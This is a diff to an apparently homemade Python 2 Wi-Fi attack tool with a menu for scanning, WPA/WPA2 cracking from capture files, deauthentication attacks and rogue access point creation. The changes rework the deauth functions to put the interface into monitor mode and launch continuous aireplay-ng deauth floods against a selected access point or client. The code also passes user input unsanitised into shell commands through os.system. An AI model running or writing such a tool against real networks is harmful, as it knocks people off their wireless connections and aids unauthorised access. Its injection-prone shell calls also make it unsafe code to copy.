@@ -8,12 +8,13 @@ from wifi import Cell, Scheme
 #interfaz = 'wlxc04a00118487'
 interfaz = raw_input('Network interface: ')
 os.system("sudo ifconfig "+interfaz+" down")
+os.system("sudo iwconfig "+interfaz+" mode managed")
 os.system("sudo ifconfig "+interfaz+" up")
 redes = []
 
 
 def menu():
-	opt_ = raw_input('\nOptions: \n1: Scan \n2: Connect \n3: Capture traffic\n4: Crack WPA/WPA2 traffic file \n5: Deauth attack \n6: Create AP\n')
+	opt_ = raw_input('\nOptions: \n1: Scan \n2: Connect (working on it)\n3: Capture traffic (working on it)\n4: Crack WPA/WPA2 from pcap\n5: Deauth attack \n6: Create AP\n')
 	if   opt_ == "1":
 		scan()
 	elif opt_=="2":
@@ -80,26 +81,27 @@ def deauth_client():
 	red=redes[int(id_red)]
 	ap_mac=red.get("mac")
 	essid=red.get("ssid")
-	channel=red.get("channel")
+	channel=red.get("canal")
 	client_mac = raw_input("Client MAC:")
-	os.system("sudo airmon-ng check kill")
-	os.system("sudo airmon-ng start "+interfaz+" "+channel)
-	interfaz_mon = raw_input("Monitorization interface:")
 	os.system("sudo ifconfig "+interfaz+" down")
-	os.system("aireplay-ng -0 0 -a "+ap_mac+"-c "+client_mac+" -e "+essid+" "+interfaz_mon)
+	os.system("sudo iwconfig "+interfaz+" mode monitor")
+	os.system("sudo ifconfig "+interfaz+" up")
+	os.system("sudo iwconfig "+interfaz+" channel "+channel)
+	os.system("aireplay-ng -0 0 -a "+ap_mac+" -c "+client_mac+" -e "+essid+" "+interfaz)
 
 
 def deauth_ap():
 	id_red = raw_input('Select id: ')
 	red=redes[int(id_red)]
+	print red
 	ap_mac=red.get("mac")
 	essid=red.get("ssid")
-	channel=red.get("channel")
-	os.system("sudo airmon-ng check kill")
-	os.system("sudo airmon-ng start "+interfaz+" "+channel)
-	interfaz_mon = raw_input("Monitorization interface:")
+	channel=red.get("canal")
 	os.system("sudo ifconfig "+interfaz+" down")
-	os.system("aireplay-ng -0 0 -a "+ap_mac+" -e "+essid+" "+interfaz_mon)
+	os.system("sudo iwconfig "+interfaz+" mode monitor")
+	os.system("sudo ifconfig "+interfaz+" up")
+	os.system("sudo iwconfig "+interfaz+" channel "+channel)
+	os.system("aireplay-ng -0 0 -a "+ap_mac+" -e "+essid+" "+interfaz)
 
 
 def deauth():
@@ -167,7 +169,7 @@ def scan():
 		count+=1
 	for red in redes:
 		print "- ", red.get("ssid"),"(ID = ",red.get("id"),")"
-		print "   MAC:"+red.get("mac")+"	Cypher:"+red.get("cifrado")+"\n   Canal:"+red.get("canal")+"("+red.get("frecuencia")+")	Rate:"+red.get("rate")
+		print "   MAC:"+red.get("mac")+"	Cypher:"+red.get("cifrado")+"\n   Canal:"+red.get("canal")+"("+red.get("frecuencia")+")		Rate:"+red.get("rate")
 		print "---------------------------------------------------------"
 	menu()
 
